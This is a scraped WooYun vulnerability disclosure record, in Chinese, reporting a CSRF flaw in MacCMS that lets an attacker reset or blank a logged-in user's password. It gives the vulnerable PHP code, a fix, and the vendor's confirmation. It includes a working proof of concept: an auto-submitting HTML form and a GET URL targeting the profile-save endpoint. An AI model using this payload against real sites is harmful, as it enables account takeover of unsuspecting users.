{"id": 51158, "wybug_id": "wooyun-2014-075499", "wybug_title": "苹果cms一处csrf可导致用户密码为空", "wybug_corp": "maccms.com", "wybug_author": "番茄炒蛋", "wybug_date": "2014-09-14 22:13", "wybug_open_date": "2014-10-29 22:14", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-29：\t细节向公众公开  简要描述： 以前在火车上的时候找到的 一直没提交 详细说明：  修改个人资料处\n\n没有原始密码，直接抓包\n\npoc\n<!DOCTYPE HTML><html><body><form id=\"demo\" name=\"demo\" action=\"http://localhost/test/maccms/index.php?m=user-save.html\" method=\"POST\"><input type=\"text\" name=\"u_password1\" value=\"admin123\" /><input type=\"text\" name=\"u_password2\" value=\"admin123\" /><input type=\"text\" name=\"u_qq\" value=\"3138469231\" /><input type=\"submit\" value=\"submit\" /></form><script>\tdocument.demo.submit();</script></body></html>\n打开后\n\n   漏洞证明：  还可以改成get\nhttp://localhost/test/maccms/index.php?m=user-save.html&u_password1=111111&u_password2=111111&u_qq=3138469231&u_email=&u_phone=&u_question=&u_answer=\n执行后密码是空的\n\n看代码maccms\\inc\\module\\user.php \nelseif($method=='save'){\tchklogin();\t$oldpass = be(\"post\",\"u_oldpass\");\t$password1 = be(\"post\",\"u_password1\");\t$password2 = be(\"post\",\"u_password2\");\t$u_qq= be(\"post\",\"u_qq\");\t$u_email = be(\"post\",\"u_email\");\t$u_phone = be(\"post\",\"u_phone\");\t$u_question = be(\"post\",\"u_question\");\t$u_answer = be(\"post\",\"u_email\");\tif (strlen($u_email)>32) { $u_email = substring($u_email,32);}\tif (strlen($u_qq)>16) { $u_qq = substring($u_qq,16);}\tif (strlen($u_phone)>16) { $u_phone = substring($u_phone,16);}    //以上是接收数据  如果为get （看be方法）　那所有数据就为空 由于并未做非空验证  所以代码一直往下执行\t$col = array(\"u_qq\",\"u_email\",\"u_password\",\"u_phone\",\"u_question\",\"u_answer\") ;\t$val = array($u_qq,$u_email,$password1,$u_phone,$u_question,$u_answer);\t\tif ($password1 != \"\"){//只验证如果密码不为空的时候\t\tif ($password1 != $password2){ alert (\"两次密码不同\");exit; }\t\t$password1 = md5($password1);\t\tarray_push($col,\"u_password\");\t\tarray_push($val,$password1);\t}\t$db->Update (\"{pre}user\",$col ,$val ,\"u_id=\".$user[\"u_id\"]);//这个时候所有数据都为空  只带了一个uid进去 所以 这个时候密码什么的都会被重置为空\talertUrl (\"修改成功！\",\"index.php?m=user-info.html\");\n然后be方法 maccms\\inc\\common\\function.php\ncase 'post':\t\t\t$res=isset($_POST[$key])$magicq?$_POST[$key]:@addslashes($_POST[$key]) : '';\t\t\tbreak; //两个三元运算符 有点饶 这时候  $res是为空的\n   修复方案：  post的csrf  referer验证，加token  然后更新个人信息的时候做非空验证   版权声明：转载请注明来源 番茄炒蛋@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-09-15 20:31 厂商回复： 已经确认此漏洞，稍后发布更新。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-15 09:37 |    \t\t番茄炒蛋 \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:31        | test)\t\t \n    增加原始密码 就行了    \n     2014-09-19 14:39 |    \t\tdarkrerror \t\t\t( 普通白帽子  |\t\t\t        Rank:263 漏洞数:44        )\t\t \n  大牛    \n     2014-10-07 10:06 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  你特么坐火车都不消停    \n     2014-10-07 23:15 |    \t\t番茄炒蛋 \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:31        | test)\t\t \n  @老和尚 90ID多少。，。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}